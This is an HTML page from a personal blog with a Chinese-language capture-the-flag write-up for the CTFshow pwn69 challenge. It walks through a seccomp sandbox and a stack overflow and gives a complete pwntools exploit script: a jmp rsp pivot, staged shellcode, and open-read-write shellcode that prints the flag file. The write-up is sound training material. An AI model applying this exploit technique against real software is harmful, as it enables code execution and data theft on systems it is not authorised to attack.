@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="CTFshow pwn69的题解，网上有很多类似的WP，这里把当时看的时候几个疑惑的地方解释下：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshowpwn69">
+<meta property="og:url" content="http://example.com/2024/08/17/ctfshowpwn69/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="CTFshow pwn69的题解，网上有很多类似的WP，这里把当时看的时候几个疑惑的地方解释下：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.picui.cn/free/2024/08/17/66c017fba8738.png">
+<meta property="article:published_time" content="2024-08-17T02:29:53.000Z">
+<meta property="article:modified_time" content="2024-08-17T03:55:26.016Z">
+<meta property="article:author" content="My0n9s">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.picui.cn/free/2024/08/17/66c017fba8738.png">
+
+
+<link rel="canonical" href="http://example.com/2024/08/17/ctfshowpwn69/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/08/17/ctfshowpwn69/","path":"2024/08/17/ctfshowpwn69/","title":"ctfshowpwn69"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshowpwn69 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/17/ctfshowpwn69/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshowpwn69 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshowpwn69
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-08-17 10:29:53 / Modified: 11:55:26" itemprop="dateCreated datePublished" datetime="2024-08-17T10:29:53+08:00">2024-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>CTFshow pwn69的题解，网上有很多类似的WP，这里把当时看的时候几个疑惑的地方解释下：</p>
+<span id="more"></span>
+
+<p>题目提示我们用ORW去拿flag。checksec看一下，开了Partial RELRO ，其他保护没开，拖到IDA分析,有几个重点函数分析下:</p>
+<p><code> mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code> ，这函数作用就是从0x123000这个地址开始的0x1000个字节，给上读写权限。</p>
+<p>然后就是sub_400949这个函数，是一个沙箱函数，我们可以借助工具来分析还有哪些可以用。工具用法:<code>seccomp-tools dump ./pwn69</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400949</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过分析可以知道只有open 、read、write可以用。再来看看sub_400A16函数，发现存在栈溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到这里，攻击思路就比较清晰了，我们想办法往mmap给的这个地址段里面写shellcode(ORW)，然后跳转到这里执行，就OK了。</p>
+<p>最终利用脚本<code> pwn69.py</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;pwn69&quot;</span>)</span><br><span class="line"><span class="comment">#orw的shellcode板子:</span></span><br><span class="line">mmap=<span class="number">0x123000</span></span><br><span class="line">orw_shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode+=shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>) <span class="comment">#0代表stdin，1代表stdout，2代表标准错误输出。其他文件就是从3开始了。</span></span><br><span class="line">orw_shellcode+=shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">shellcode=asm(orw_shellcode)</span><br><span class="line"><span class="comment">#payload，即栈溢出发送过去的数据</span></span><br><span class="line">jmp_rsp=<span class="number">0x400a01</span></span><br><span class="line">payload=asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) <span class="comment">#从标准输入里面读入0x100个字节到mmap</span></span><br><span class="line">payload+=asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>) <span class="comment"># 跳转到mmap地址</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># buf距离ebp 0x20个字节，覆盖掉ebp的8个字节，再往后写就是覆盖返回地址。</span></span><br><span class="line">payload+=p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;do&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里的payload解释下，用我个人的话来说就是套娃的存在。这个payload就是先把返回地址覆盖成了<code>jmp rsp</code> ，然后通过改变rsp指针的值，让它指向buf，然后程序就会去执行我们一开始在payload里面写好的<code>asm(shellcraft.read(0,mmap,0x100))</code> 以及 <code>asm(&quot;mov rax,0x123000;jmp rax&quot;) </code>。</p>
+<p>到这里有几个地方需要解释下：<code>jmp rsp</code> 之后改变了程序的执行流程，后面也都会被当作程序指令去执行，所以我们<code>sub rsp,0x30;jmp rsp</code>才会被当作指令去执行。另外一点就是<code>sub rsp,0x30</code>起到了一个什么作用，可能一开始是有点懵的，其实画个图就很清楚了。</p>
+<p><img src="https://img.picui.cn/free/2024/08/17/66c017fba8738.png" alt="pwn69_2.png"></p>
+<p>执行到返回地址时，此时rsp指向返回地址，pop弹出到ip，然后此时rsp指向为红色rsp，然后ip执行jmp rsp，相当于跳转到了红色rsp那里的执向，然后就会执行<code>asm(sub rsp xxx) </code>，<strong>至于buf和此时的rsp为啥是0x30，这个可以通过gdb调试去看</strong>。然后<code>jmp rsp</code>，再一次改变程序执行流程，就会来到蓝色rsp这里执行了。就套了一层读入的操作(此时我们就可以往mmap读shellcode)，然后跳转到mmap那边执行。就成功了。</p>
+<p>这里的调试也要注意，断点打在read函数调用完之后，(打到之前发现程序每次都是把read走完了的，并没有停下来。这里感谢肖总帮我看了很久。。。)</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/14/%E5%89%8D%E8%A8%80/" rel="prev" title="前言">
+                  <i class="fa fa-angle-left"></i> 前言
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
